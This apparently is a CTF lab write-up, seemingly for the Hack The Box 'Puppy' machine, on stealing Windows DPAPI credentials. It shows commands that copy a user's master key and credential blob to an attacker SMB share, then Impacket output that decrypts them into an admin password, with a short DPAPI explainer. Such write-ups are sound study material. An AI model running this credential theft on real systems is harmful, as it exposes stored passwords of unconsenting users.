- if you have interactive session `query user` on the box, you can get the the key by asking the DC, this is valid because your user credentials are cached, you can use mimikatz 
  `dpapi::masterkey /in:<PATH TO key> /rpc` the `/rpc` is the big win, because it talks to DC to decrypt the key for us.
Copy 2 file, one is the master key And the other is where other passwords is stored.


> [!NOTE] Master key password
> The master key is protected using password, mostly its the login password of the user.

```powershell
*Evil-WinRM* PS C:\> copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407" \\10.10.16.75\share\masterkey_blob
*Evil-WinRM* PS C:\> copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9" \\10.10.16.75\share\credential_blob
```

```sh
> impacket.dpapi masterkey -file masterkey_blob -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

```sh
> impacket.dpapi credential -file credential_blob -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
	Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!

```


## Windows DPAPI workflow

### 1. Protected Secrets
- Apps (like Chrome, RDP, Wi-Fi, Outlook, etc.) don’t store plaintext passwords.
- Instead, they use **DPAPI** (`CryptProtectData` API) to encrypt them.
- The output is stored in `AppData\Roaming\Microsoft\Credentials\` as **credential blobs**, or in browser profiles, etc.
### 2. Master Keys
- DPAPI doesn’t encrypt directly with the user’s password.
- Each user has one or more **master keys** stored in:
```powershell
C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\
```
- Each master key file is encrypted using a key derived from the user’s Windows **logon password (or domain creds)**.
### 3. Decrypting a Master Key
- To decrypt a master key, you need the **user’s password hash** (NT hash, or the plaintext password).
- Tools like `mimikatz` or `dpapi.py` (from Impacket) can use the NT hash to decrypt it.
- Once decrypted, you get the **DPAPI Master Key (plaintext)**.
### 4. Using the Master Key
- The decrypted master key can then be used to open the **credential blobs**:
```sh
C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
```
- Each blob maps to a saved secret (Wi-Fi PSK, RDP password, browser login, etc.).